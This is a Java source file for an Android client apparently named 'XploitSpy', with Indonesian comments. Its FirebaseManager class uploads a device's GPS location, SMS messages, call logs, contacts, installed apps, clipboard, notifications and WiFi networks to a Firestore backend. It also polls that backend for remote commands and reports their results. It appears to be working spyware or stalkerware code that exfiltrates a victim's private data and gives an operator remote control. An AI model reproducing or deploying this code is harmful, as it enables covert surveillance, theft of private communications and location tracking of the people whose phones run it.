package com.xploitspy.client.manager;

import android.content.Context;
import android.util.Log;
import com.google.firebase.FirebaseApp;
import com.google.firebase.firestore.FirebaseFirestore;
import com.google.firebase.firestore.SetOptions;
import com.xploitspy.client.Config;
import org.json.JSONArray;
import org.json.JSONObject;
import java.util.HashMap;
import java.util.Map;

/**
 * FirebaseManager - Mengelola koneksi dan pengiriman data ke Firebase Firestore
 * Memungkinkan monitoring dari jaringan manapun
 */
public class FirebaseManager {
    
    private static final String TAG = "FirebaseManager";
    private FirebaseFirestore db;
    private Context context;
    private String deviceId;
    
    public FirebaseManager(Context context) {
        this.context = context;
        
        // Initialize Firebase if not already initialized
        if (FirebaseApp.getApps(context).isEmpty()) {
            FirebaseApp.initializeApp(context);
        }
        
        this.db = FirebaseFirestore.getInstance();
        this.deviceId = Config.getDeviceId(context);
    }
    
    public void registerDevice(String deviceName, String productName, String androidVersion) {
        Map<String, Object> deviceInfo = new HashMap<>();
        deviceInfo.put("deviceName", deviceName);
        deviceInfo.put("productName", productName != null ? productName : "Unknown");
        deviceInfo.put("androidVersion", androidVersion);
        deviceInfo.put("lastSeen", System.currentTimeMillis());
        deviceInfo.put("status", "online");
        
        db.collection("devices").document(deviceId)
            .set(deviceInfo, SetOptions.merge())
            .addOnSuccessListener(aVoid -> {
                Log.d(TAG, "Device registered in Firebase: " + deviceId + " (Product: " + productName + ")");
            })
            .addOnFailureListener(e -> {
                Log.e(TAG, "Error registering device", e);
            });
    }
    
    public void updateDeviceStatus(int batteryLevel, boolean isCharging) {
        Map<String, Object> update = new HashMap<>();
        update.put("lastSeen", System.currentTimeMillis());
        update.put("status", "online");
        update.put("batteryLevel", batteryLevel);
        update.put("isCharging", isCharging);
        
        db.collection("devices").document(deviceId)
            .update(update)
            .addOnFailureListener(e -> Log.e(TAG, "Error updating device status", e));
    }
    
    public void sendGps(double latitude, double longitude, float accuracy, double altitude) {
        Map<String, Object> gpsData = new HashMap<>();
        gpsData.put("latitude", latitude);
        gpsData.put("longitude", longitude);
        gpsData.put("accuracy", accuracy);
        gpsData.put("altitude", altitude);
        gpsData.put("timestamp", System.currentTimeMillis());
        
        db.collection("devices").document(deviceId)
            .collection("gps_logs").document(String.valueOf(System.currentTimeMillis()))
            .set(gpsData)
            .addOnFailureListener(e -> Log.e(TAG, "Error sending GPS", e));
    }
    
    public void sendSms(String phoneNumber, String message, String type, long timestamp) {
        Map<String, Object> smsData = new HashMap<>();
        smsData.put("phoneNumber", phoneNumber);
        smsData.put("message", message);
        smsData.put("type", type);
        smsData.put("timestamp", timestamp); // Use real timestamp from SMS
        
        // Use timestamp as document ID to avoid duplicates
        db.collection("devices").document(deviceId)
            .collection("sms_logs").document(String.valueOf(timestamp))
            .set(smsData, SetOptions.merge())
            .addOnFailureListener(e -> Log.e(TAG, "Error sending SMS", e));
    }
    
    public void sendCall(String phoneNumber, String callType, int duration) {
        Map<String, Object> callData = new HashMap<>();
        callData.put("phoneNumber", phoneNumber);
        callData.put("callType", callType);
        callData.put("duration", duration);
        callData.put("timestamp", System.currentTimeMillis());
        
        db.collection("devices").document(deviceId)
            .collection("call_logs").document(String.valueOf(System.currentTimeMillis()))
            .set(callData)
            .addOnFailureListener(e -> Log.e(TAG, "Error sending call", e));
    }
    
    public void sendContacts(JSONArray contacts) {
        for (int i = 0; i < contacts.length(); i++) {
            try {
                JSONObject contact = contacts.getJSONObject(i);
                Map<String, Object> contactData = new HashMap<>();
                contactData.put("name", contact.getString("name"));
                contactData.put("phoneNumber", contact.getString("phoneNumber"));
                contactData.put("email", contact.optString("email", ""));
                contactData.put("timestamp", System.currentTimeMillis());
                
                db.collection("devices").document(deviceId)
                    .collection("contacts").document(contact.optString("phoneNumber", String.valueOf(i)))
                    .set(contactData, SetOptions.merge())
                    .addOnFailureListener(e -> Log.e(TAG, "Error sending contact", e));
            } catch (Exception e) {
                Log.e(TAG, "Error processing contact", e);
            }
        }
    }
    
    public void sendApps(JSONArray apps) {
        long timestamp = System.currentTimeMillis();
        for (int i = 0; i < apps.length(); i++) {
            try {
                JSONObject app = apps.getJSONObject(i);
                Map<String, Object> appData = new HashMap<>();
                appData.put("name", app.getString("name"));
                appData.put("packageName", app.getString("packageName"));
                appData.put("version", app.getString("version"));
                appData.put("timestamp", timestamp);
                
                db.collection("devices").document(deviceId)
                    .collection("apps").document(app.getString("packageName"))
                    .set(appData, SetOptions.merge())
                    .addOnFailureListener(e -> Log.e(TAG, "Error sending app", e));
            } catch (Exception e) {
                Log.e(TAG, "Error processing app", e);
            }
        }
    }
    
    public void sendClipboard(String content) {
        Map<String, Object> clipboardData = new HashMap<>();
        clipboardData.put("content", content);
        clipboardData.put("timestamp", System.currentTimeMillis());
        
        db.collection("devices").document(deviceId)
            .collection("clipboard").document(String.valueOf(System.currentTimeMillis()))
            .set(clipboardData)
            .addOnFailureListener(e -> Log.e(TAG, "Error sending clipboard", e));
    }
    
    public void sendNotification(String appName, String title, String content) {
        Map<String, Object> notificationData = new HashMap<>();
        notificationData.put("appName", appName);
        notificationData.put("title", title);
        notificationData.put("content", content);
        notificationData.put("timestamp", System.currentTimeMillis());
        
        db.collection("devices").document(deviceId)
            .collection("notifications").document(String.valueOf(System.currentTimeMillis()))
            .set(notificationData)
            .addOnFailureListener(e -> Log.e(TAG, "Error sending notification", e));
    }
    
    public void sendWifi(JSONArray networks) {
        Map<String, Object> wifiData = new HashMap<>();
        wifiData.put("networks", networks.toString());
        wifiData.put("timestamp", System.currentTimeMillis());
        
        db.collection("devices").document(deviceId)
            .collection("wifi").document(String.valueOf(System.currentTimeMillis()))
            .set(wifiData)
            .addOnFailureListener(e -> Log.e(TAG, "Error sending WiFi", e));
    }
    
    public void listenForCommands(CommandHandler handler) {
        db.collection("devices").document(deviceId)
            .collection("commands")
            .whereEqualTo("status", "pending")
            .addSnapshotListener((snapshot, e) -> {
                if (e != null) {
                    Log.e(TAG, "Error listening for commands", e);
                    return;
                }
                
                if (snapshot != null) {
                    for (var doc : snapshot.getDocumentChanges()) {
                        if (doc.getType() == com.google.firebase.firestore.DocumentChange.Type.ADDED) {
                            var data = doc.getDocument().getData();
                            String command = (String) data.get("command");
                            Map<String, Object> parameters = (Map<String, Object>) data.get("parameters");
                            
                            handler.handle(doc.getDocument().getId(), command, parameters);
                            
                            // Mark as received
                            doc.getDocument().getReference()
                                .update("status", "received")
                                .addOnFailureListener(err -> Log.e(TAG, "Error updating command status", err));
                        }
                    }
                }
            });
    }
    
    public void updateCommandResult(String commandId, boolean success, Object result) {
        Map<String, Object> update = new HashMap<>();
        update.put("status", success ? "completed" : "failed");
        update.put("result", result.toString());
        update.put("executed_at", System.currentTimeMillis());
        
        db.collection("devices").document(deviceId)
            .collection("commands").document(commandId)
            .update(update)
            .addOnFailureListener(e -> Log.e(TAG, "Error updating command result", e));
    }
    
    public interface CommandHandler {
        void handle(String commandId, String command, Map<String, Object> parameters);
    }
}

